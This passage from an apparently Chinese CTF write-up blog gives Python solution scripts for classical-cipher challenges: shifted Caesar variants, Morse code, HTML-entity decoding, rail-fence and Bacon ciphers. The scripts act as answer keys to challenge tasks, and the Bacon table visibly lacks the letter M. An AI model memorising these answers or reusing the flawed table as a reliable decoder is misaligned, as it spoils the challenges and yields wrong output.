class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">    steady_str = steady(str1,i)</span><br><span class="line">    print(steady_str)</span><br></pre></td></tr></table></figure><p>每一位的移位数量不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">start=<span class="number">5</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_str)):</span><br><span class="line">    print(steady_str[i])</span><br><span class="line">    flag+=chr(ord(steady_str[i])+start)</span><br><span class="line">    start+=<span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>Task:<br>I guess you are done with Caesar, aren’t you?<br>The big problem with caesar is that it does not allow digits or other characters.<br>I have fixed this, and now I can use any ascii character in the plaintext.<br>The keyspace has increased from 26 to 128 too. \o/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data2&#x3D;&quot;372332333823253030333b23282d2b2d38372333362333382c293623272c25362527382936370d232c253a29232a2d3c292823382c2d37232532282332333b230d23272532233937292325323d232537272d2d23272c25362527382936232d3223382c29233430252d3238293c382a30252b1e0e14073f3d33392336233b2d3241&quot;</span><br><span class="line">for i in range(128):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    for j in range(0,len(data2),2):</span><br><span class="line">        string&#x3D;&quot;0x&quot; + data2[j:j+2]</span><br><span class="line">        inting&#x3D;int(string,16)+i</span><br><span class="line">        if inting &gt; 128:</span><br><span class="line">            flag+&#x3D;chr(inting%128)</span><br><span class="line">        else:</span><br><span class="line">            flag+&#x3D;chr(inting)</span><br><span class="line">    if &quot;ZJPC&quot; in flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><h2 id="莫斯密码"><a href="#莫斯密码" class="headerlink" title="莫斯密码"></a>莫斯密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">steady_str1=<span class="string">&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;</span></span><br><span class="line">steady_str2=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_str4=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str1:</span><br><span class="line">    steady_str2+=dict1[i]</span><br><span class="line">print(<span class="string">&quot;莫斯电码为：&quot;</span>+steady_str2)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> steady_str2:</span><br><span class="line">    steady_str3=steady_str2.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;分割莫斯电码：&quot;</span>)</span><br><span class="line">print(steady_str3)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> steady_str3:</span><br><span class="line">    steady_str4+=dict2[z]</span><br><span class="line">print(<span class="string">&quot;flag：&quot;</span>+steady_str4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">dict2 = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27; &#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">steady_str=<span class="string">&quot;o00。o。o0oo。0o0o。000。00。o。0。000。ooo0。o。0o。oo0。ooo。0o0o。0。oo0o&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&#x27;。&#x27;</span>:</span><br><span class="line">        flag+=i.replace(<span class="string">&#x27;。&#x27;</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">new_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">flag=flag.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(i)</span><br><span class="line">    new_flag+=dict2[i]</span><br><span class="line">print(new_flag)</span><br></pre></td></tr></table></figure><h2 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;&quot;</span></span><br><span class="line">steady_str1=steady_str.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">steady_str3=[]</span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str1:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        steady_str2=i.split(<span class="string">&#x27;&amp;#&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    steady_str3.append(steady_str2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str3:</span><br><span class="line">    steady_flag+=chr(int(i))</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="栏栅密码"><a href="#栏栅密码" class="headerlink" title="栏栅密码"></a>栏栅密码</h2><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fence</span>(<span class="params">lst, numrails</span>):</span></span><br><span class="line">    fence = [[<span class="literal">None</span>] * len(lst) <span class="keyword">for</span> n <span class="keyword">in</span> range(numrails)]</span><br><span class="line">    rails = range(numrails - <span class="number">1</span>) + range(numrails - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> n, x <span class="keyword">in</span> enumerate(lst):</span><br><span class="line">        fence[rails[n % len(rails)]][n] = x</span><br><span class="line">    <span class="keyword">return</span> [c <span class="keyword">for</span> rail <span class="keyword">in</span> fence <span class="keyword">for</span> c <span class="keyword">in</span> rail <span class="keyword">if</span> c <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">text, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(fence(text, n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">text, n</span>):</span></span><br><span class="line">    rng = range(len(text))</span><br><span class="line">    pos = fence(rng, n)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(text[pos.index(n)] <span class="keyword">for</span> n <span class="keyword">in</span> rng)</span><br><span class="line"></span><br><span class="line">z = <span class="string">&quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>):</span><br><span class="line">    y = decode(z,i)</span><br><span class="line">    <span class="keyword">print</span> y</span><br></pre></td></tr></table></figure><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span>(<span class="params">m</span>):</span></span><br><span class="line">    basic1 = &#123;</span><br><span class="line">    <span class="string">&#x27;AAAAA&#x27;</span> : <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAAAB&#x27;</span> : <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABA&#x27;</span> : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AAABB&#x27;</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAA&#x27;</span> : <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABAB&#x27;</span> : <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBA&#x27;</span> : <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;AABBB&#x27;</span> : <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAA&#x27;</span> : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABAAB&#x27;</span> : <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABA&#x27;</span> : <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABABB&#x27;</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBAB&#x27;</span> : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBA&#x27;</span> : <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ABBBB&#x27;</span> : <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAA&#x27;</span> : <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAAAB&#x27;</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABA&#x27;</span> : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BAABB&#x27;</span> : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAA&#x27;</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABAB&#x27;</span> : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBA&#x27;</span> : <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BABBB&#x27;</span> : <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAA&#x27;</span> : <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BBAAB&#x27;</span> : <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    output = <span 